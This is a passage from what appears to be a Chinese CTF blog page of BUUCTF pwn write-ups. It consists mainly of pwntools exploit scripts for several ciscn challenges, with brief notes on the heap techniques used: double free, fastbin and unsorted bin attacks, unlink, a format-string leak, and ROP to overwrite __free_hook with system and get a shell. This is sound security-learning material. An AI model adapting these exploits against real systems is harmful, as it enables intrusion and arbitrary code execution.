class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_final_3")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(idx,size,content):</span><br><span class="line">    sh.recvuntil("choice > ")</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.recvuntil("input the index")</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil("input the size")</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil("now you can write something")</span><br><span class="line">    sh.send(content)</span><br><span class="line">    sh.recvuntil("gift :0x")</span><br><span class="line">    return int(sh.recvuntil("\n",True),16)</span><br><span class="line">def free(idx):</span><br><span class="line">    sh.recvuntil("choice > ")</span><br><span class="line">    sh.sendline("2")</span><br><span class="line">    sh.recvuntil("input the index")</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./ciscn_final_3")</span><br><span class="line">        lib = ELF('libc.so.6')</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF('libc.so.6')</span><br><span class="line">    addr1 = add(0,0x78,"\x11" * 0x78)</span><br><span class="line">    heap_base = addr1 - 0x11E70</span><br><span class="line">    addr2 = add(1,0x0,'')</span><br><span class="line">    add(2,0x78,'\x33' * 0x78)</span><br><span class="line">    add(3,0x78,'\x44' * 0x78)</span><br><span class="line">    add(4,0x78,'\x55' * 0x78)</span><br><span class="line">    add(5,0x78,'\x66' * 0x78)</span><br><span class="line">    add(6,0x78,'\x77' * 0x78)</span><br><span class="line">    add(7,0x78,'\x88' * 0x78)</span><br><span class="line">    add(8,0x78,'/bin/sh\x00')</span><br><span class="line">    add(9,0x78,'\xaa' * 0x78)</span><br><span class="line">    add(10,0x78,'\xaa' * 0x78)</span><br><span class="line">    add(11,0x78,'\xbb' * 0x78)</span><br><span class="line">    free(11)</span><br><span class="line">    free(11)</span><br><span class="line">    add(12,0x78,p64(addr1 - 0x10))</span><br><span class="line">    add(13,0x78,p64(addr1 - 0x10))</span><br><span class="line">    add(14,0x78,p64(0) + p64(0x4A1))</span><br><span class="line">    free(0)</span><br><span class="line">    free(1)</span><br><span class="line">    add(15,0x78,'\xaa' * 0x78)</span><br><span class="line">    add(16,0,'')</span><br><span class="line">    main_arena = add(17,0,'')</span><br><span class="line">    libc = main_arena - 0x3EBCA0</span><br><span class="line">    __free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">    system = libc + lib.symbols['system']</span><br><span class="line">    add(18,0x28,p64(0xdeadbeef))</span><br><span class="line">    free(18)</span><br><span class="line">    free(18)</span><br><span class="line">    add(19,0x28,p64(__free_hook))</span><br><span class="line">    add(20,0x28,p64(__free_hook))</span><br><span class="line">    add(21,0x28,p64(system))</span><br><span class="line">    free(8)</span><br><span class="line">    log.success('addr1 = ' + hex(addr1))</span><br><span class="line">    log.success('addr2 = ' + hex(addr2))</span><br><span class="line">    log.success("heap_base: " + hex(heap_base))</span><br><span class="line">    log.success("libc: " + hex(libc))</span><br><span class="line">    log.success("main_arena: " + hex(main_arena))</span><br><span class="line">    log.success('system: ' + hex(system))</span><br><span class="line">    log.success('__free_hook: ' + hex(__free_hook))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("f.buuoj.cn",20232,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x31-ciscn-2019-en-3"><a href="#0x31-ciscn-2019-en-3" class="headerlink" title="0x31 ciscn_2019_en_3"></a>0x31 ciscn_2019_en_3</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_en_3")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def free(idx):</span><br><span class="line">sh.recvuntil("Input your choice:")</span><br><span class="line">sh.sendline("4")</span><br><span class="line">sh.recvuntil("Please input the index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def add(size,content):</span><br><span class="line">sh.recvuntil("Input your choice:")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("Please input the size of story:")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil("please inpute the story:")</span><br><span class="line">sh.send(content)</span><br><span class="line">def inputName(name):</span><br><span class="line">sh.recvuntil("What's your name?")</span><br><span class="line">sh.send(name)</span><br><span class="line">def inputID(idx):</span><br><span class="line">sh.recvuntil("ID")</span><br><span class="line">        sh.sendline(idx)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_en_3")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">inputName("%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\x00\x00")</span><br><span class="line">sh.recvuntil("(nil)(nil)")</span><br><span class="line">sh.recv(2)</span><br><span class="line">libc = int(sh.recvuntil("0x",True),16) - 0x78439</span><br><span class="line">sh.recv(68)</span><br><span class="line">base = int(sh.recv(12),16) - 0xA00</span><br><span class="line">chunk_list = base + 0x202060</span><br><span class="line">sh.recv(2)</span><br><span class="line">canary = int(sh.recv(16),16)</span><br><span class="line">sh.recv(2)</span><br><span class="line">ebp = int(sh.recvuntil("Please",True),16)</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">fastbin_attack_addr1 = ebp - 0x58</span><br><span class="line">fastbin_attack_addr2 = ebp - 0x30</span><br><span class="line">pop_rdi_ret = 0x0000000000000f83 + base</span><br><span class="line">inputID(p64(0x61))</span><br><span class="line">add(0x50,"\x11")</span><br><span class="line">add(0x50,"\x11")</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">add(0x50,p64(fastbin_attack_addr1))</span><br><span class="line">add(0x50,p64(fastbin_attack_addr1))</span><br><span class="line">add(0x50,p64(fastbin_attack_addr1))</span><br><span class="line">add(0x50,p64(0)*4 + p64(0x51))</span><br><span class="line">add(0x40,"\x11")</span><br><span class="line">add(0x40,"\x11")</span><br><span class="line">free(6)</span><br><span class="line">free(7)</span><br><span class="line">free(6)</span><br><span class="line">add(0x40,p64(fastbin_attack_addr2))</span><br><span class="line">add(0x40,p64(fastbin_attack_addr2))</span><br><span class="line">add(0x40,p64(fastbin_attack_addr2))</span><br><span class="line">#input()</span><br><span class="line">add(0x40,p64(0) + p64(canary) + p64(0) + p64(pop_rdi_ret) + p64(binsh) + p64(system))</span><br><span class="line">#x/50gx (long long)(&main_arena) - 0x30</span><br><span class="line">sh.recvuntil("Input your choice:")</span><br><span class="line">sh.sendline("6")</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("base: " + hex(base))</span><br><span class="line">log.success("chunk_list: " + hex(chunk_list))</span><br><span class="line">log.success("ebp: " + hex(ebp))</span><br><span class="line">log.success("canary: " + hex(canary))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("binsh: " + hex(binsh))</span><br><span class="line">log.success("fastbin_attack_addr1: " + hex(fastbin_attack_addr1))</span><br><span class="line">log.success("fastbin_attack_addr2: " + hex(fastbin_attack_addr2))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("f.buuoj.cn",20124,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x32-ciscn-2019-c-5"><a href="#0x32-ciscn-2019-c-5" class="headerlink" title="0x32 ciscn_2019_c_5"></a>0x32 ciscn_2019_c_5</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_c_5")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def free(idx):</span><br><span class="line">sh.recvuntil("Input your choice:")</span><br><span class="line">sh.sendline("4")</span><br><span class="line">sh.recvuntil("Please input the index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def add(size,content):</span><br><span class="line">sh.recvuntil("Input your choice:")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("Please input the size of story:")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil("please inpute the story:")</span><br><span class="line">sh.send(content)</span><br><span class="line">def inputName(name):</span><br><span class="line">sh.recvuntil("What's your name?")</span><br><span class="line">sh.send(name)</span><br><span class="line">def inputID(idx):</span><br><span class="line">sh.recvuntil("ID")</span><br><span class="line">        sh.sendline(idx)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_c_5")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">inputName("%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\x00\x00")</span><br><span class="line">sh.recvuntil("(nil)(nil)")</span><br><span class="line">sh.recv(2)</span><br><span class="line">libc = int(sh.recvuntil("0x",True),16) - 0x78439</span><br><span class="line">sh.recv(68)</span><br><span class="line">base = int(sh.recv(12),16) - 0xA00</span><br><span class="line">chunk_list = base + 0x202060</span><br><span class="line">sh.recv(2)</span><br><span class="line">canary = int(sh.recv(16),16)</span><br><span class="line">sh.recv(2)</span><br><span class="line">ebp = int(sh.recvuntil("Please",True),16)</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">fastbin_attack_addr1 = ebp - 0x58</span><br><span class="line">fastbin_attack_addr2 = ebp - 0x30</span><br><span class="line">pop_rdi_ret = 0x0000000000000f83 + base</span><br><span class="line">inputID(p64(0x61))</span><br><span class="line">add(0x50,"\x11")</span><br><span class="line">add(0x50,"\x11")</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">add(0x50,p64(fastbin_attack_addr1))</span><br><span class="line">add(0x50,p64(fastbin_attack_addr1))</span><br><span class="line">add(0x50,p64(fastbin_attack_addr1))</span><br><span class="line">add(0x50,p64(0)*4 + p64(0x51))</span><br><span class="line">add(0x40,"\x11")</span><br><span class="line">add(0x40,"\x11")</span><br><span class="line">free(6)</span><br><span class="line">free(7)</span><br><span class="line">free(6)</span><br><span class="line">add(0x40,p64(fastbin_attack_addr2))</span><br><span class="line">add(0x40,p64(fastbin_attack_addr2))</span><br><span class="line">add(0x40,p64(fastbin_attack_addr2))</span><br><span class="line">#input()</span><br><span class="line">add(0x40,p64(0) + p64(canary) + p64(0) + p64(pop_rdi_ret) + p64(binsh) + p64(system))</span><br><span class="line">#x/50gx (long long)(&main_arena) - 0x30</span><br><span class="line">sh.recvuntil("Input your choice:")</span><br><span class="line">sh.sendline("6")</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("base: " + hex(base))</span><br><span class="line">log.success("chunk_list: " + hex(chunk_list))</span><br><span class="line">log.success("ebp: " + hex(ebp))</span><br><span class="line">log.success("canary: " + hex(canary))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("binsh: " + hex(binsh))</span><br><span class="line">log.success("fastbin_attack_addr1: " + hex(fastbin_attack_addr1))</span><br><span class="line">log.success("fastbin_attack_addr2: " + hex(fastbin_attack_addr2))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("f.buuoj.cn",20118,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x33-ciscn-2019-es-4"><a href="#0x33-ciscn-2019-es-4" class="headerlink" title="0x33 ciscn_2019_es_4"></a>0x33 ciscn_2019_es_4</h2><h3 id="可以考虑用unlink来获得对chunk-list控制"><a href="#可以考虑用unlink来获得对chunk-list控制" class="headerlink" title="可以考虑用unlink来获得对chunk_list控制"></a>可以考虑用unlink来获得对chunk_list控制</h3><h3 id="将unlink攻击的堆块放到第32个位置，使得edit时可以改变key1和key2的值，进行解锁功能。"><a href="#将unlink攻击的堆块放到第32个位置，使得edit时可以改变key1和key2的值，进行解锁功能。" class="headerlink" title="将unlink攻击的堆块放到第32个位置，使得edit时可以改变key1和key2的值，进行解锁功能。"></a>将unlink攻击的堆块放到第32个位置，使得edit时可以改变key1和key2的值，进行解锁功能。</h3><h3 id="如果完成以上两行的攻击后，接下来只需要got-leak，然后libc-leak，然后写-free-hook为system即可"><a href="#如果完成以上两行的攻击后，接下来只需要got-leak，然后libc-leak，然后写-free-hook为system即可" class="headerlink" title="如果完成以上两行的攻击后，接下来只需要got leak，然后libc leak，然后写__free_hook为system即可"></a>如果完成以上两行的攻击后，接下来只需要got leak，然后libc leak，然后写__free_hook为system即可</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_es_4")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(idx,size,content):</span><br><span class="line">sh.recvuntil("4.show")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil("size:")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil("gift: ")</span><br><span class="line">data = int(sh.recvuntil("\n",True),16)</span><br><span class="line">sh.recvuntil("content:")</span><br><span class="line">sh.send(content)</span><br><span class="line">return data</span><br><span class="line">def edit(idx,content):</span><br><span class="line">sh.recvuntil("4.show")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">sh.recvuntil("index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil("content:")</span><br><span class="line">sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">sh.recvuntil("4.show")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil("index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">return True</span><br><span class="line">def show(idx):</span><br><span class="line">sh.recvuntil("4.show")</span><br><span class="line">sh.sendline("4")</span><br><span class="line">sh.recvuntil("index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">return True</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_es_4")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF('/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6')</span><br><span class="line">heap_list = 0x6020E0</span><br><span class="line">key1 = 0x6022BC</span><br><span class="line">key2 = 0x6022B8</span><br><span class="line">add(0,0xF8,"\x11" * 0xF8)</span><br><span class="line">add(1,0xF8,"\x22" * 0xF8)</span><br><span class="line">add(2,0xF8,'\x33' * 0xF8)</span><br><span class="line">add(3,0xF8,'/bin/sh\x00')</span><br><span class="line">add(32,0xF8,'\x55' * 0xF8)</span><br><span class="line">add(5,0xF8,'\x66' * 0xF8)</span><br><span class="line">add(6,0xF8,'\x77' * 0xF8)</span><br><span class="line">payload  = ''</span><br><span class="line">payload += p64(0x110) + p64(0xF1) + p64(heap_list + 32*0x8 - 0x18) + p64(heap_list + 32*0x8 - 0x10)</span><br><span class="line">payload = payload.ljust(0xF0,"\xaa")</span><br><span class="line">payload += p64(0xF0)</span><br><span class="line">edit(32,payload)</span><br><span class="line">free(5)</span><br><span class="line">payload = p64(0) * 3 + p64(heap_list) + p64(0)*26 + p64(0x0000000300000001) </span><br><span class="line">edit(32,payload)</span><br><span class="line">edit(32,p64(elf.got['__libc_start_main']))</span><br><span class="line">show(0)</span><br><span class="line">__libc_start_main = u64(sh.recvuntil("\x0a\x31",True).ljust(8,'\x00')) >> 8</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">__free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">binsh = libc + lib.search('/bin/sh\x00').next()</span><br><span class="line">payload = p64(__free_hook)</span><br><span class="line">edit(32,payload)</span><br><span class="line">edit(0,p64(system))</span><br><span class="line">free(3)</span><br><span class="line">log.success("binsh: " + hex(binsh))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("__libc_start_main: " + hex(__libc_start_main))</span><br><span class="line">log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("f.buuoj.cn",20176,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x34-ciscn-2019-es-1"><a href="#0x34-ciscn-2019-es-1" class="headerlink" title="0x34 ciscn_2019_es_1"></a>0x34 ciscn_2019_es_1</h2><h3 id="由于题目要求是2-29，但是环境是2-23，所以解法会有较大差别，但是按环境为主"><a href="#由于题目要求是2-29，但是环境是2-23，所以解法会有较大差别，但是按环境为主" class="headerlink" title="由于题目要求是2.29，但是环境是2.23，所以解法会有较大差别，但是按环境为主"></a>由于题目要求是2.29，但是环境是2.23，所以解法会有较大差别，但是按环境为主</h3><h3 id="由于只能申请12个堆块，而且一次add会申请两个堆块，对我们的堆块利用会造成干扰，所以我们需要在最后一次add的时候，同时完成unsorted-bin-attack和fastbin-attack的组合式攻击"><a href="#由于只能申请12个堆块，而且一次add会申请两个堆块，对我们的堆块利用会造成干扰，所以我们需要在最后一次add的时候，同时完成unsorted-bin-attack和fastbin-attack的组合式攻击" class="headerlink" title="由于只能申请12个堆块，而且一次add会申请两个堆块，对我们的堆块利用会造成干扰，所以我们需要在最后一次add的时候，同时完成unsorted bin attack和fastbin attack的组合式攻击"></a>由于只能申请12个堆块，而且一次add会申请两个堆块，对我们的堆块利用会造成干扰，所以我们需要在最后一次add的时候，同时完成unsorted bin attack和fastbin attack的组合式攻击</h3><h3 id="1、leak-libc和heap-base这个攻击手法就不用多说了"><a href="#1、leak-libc和heap-base这个攻击手法就不用多说了" class="headerlink" title="1、leak libc和heap_base这个攻击手法就不用多说了"></a>1、leak libc和heap_base这个攻击手法就不用多说了</h3><h3 id="2、先两次double-free和fastbin-attack把被攻击堆块放入bins中，然后修改unsorted-bin的bk，使得free-hook的低位地址写入0x7f开头的大数，然后在最后一次add，通过malloc-0x18-完成unsorted-bin-attack，写入大数，然后同时malloc-0x68-fastbin-attack，覆盖free-hook为system"><a href="#2、先两次double-free和fastbin-attack把被攻击堆块放入bins中，然后修改unsorted-bin的bk，使得free-hook的低位地址写入0x7f开头的大数，然后在最后一次add，通过malloc-0x18-完成unsorted-bin-attack，写入大数，然后同时malloc-0x68-fastbin-attack，覆盖free-hook为system" class="headerlink" title="2、先两次double free和fastbin attack把被攻击堆块放入bins中，然后修改unsorted bin的bk，使得free_hook的低位地址写入0x7f开头的大数，然后在最后一次add，通过malloc(0x18)完成unsorted bin attack，写入大数，然后同时malloc(0x68)fastbin attack，覆盖free_hook为system"></a>2、先两次double free和fastbin attack把被攻击堆块放入bins中，然后修改unsorted bin的bk，使得<strong>free_hook的低位地址写入0x7f开头的大数，然后在最后一次add，通过malloc(0x18)完成unsorted bin attack，写入大数，然后同时malloc(0x68)fastbin attack，覆盖</strong>free_hook为system</h3><h3 id="然后free一个内容为-bin-sh-x00的堆块即可，推荐使用double-free之后，第二次add的堆块的内容设置为-bin-sh-x00"><a href="#然后free一个内容为-bin-sh-x00的堆块即可，推荐使用double-free之后，第二次add的堆块的内容设置为-bin-sh-x00" class="headerlink" title="然后free一个内容为/bin/sh\x00的堆块即可，推荐使用double free之后，第二次add的堆块的内容设置为/bin/sh\x00"></a>然后free一个内容为/bin/sh\x00的堆块即可，推荐使用double free之后，第二次add的堆块的内容设置为<code>/bin/sh\x00</code></h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 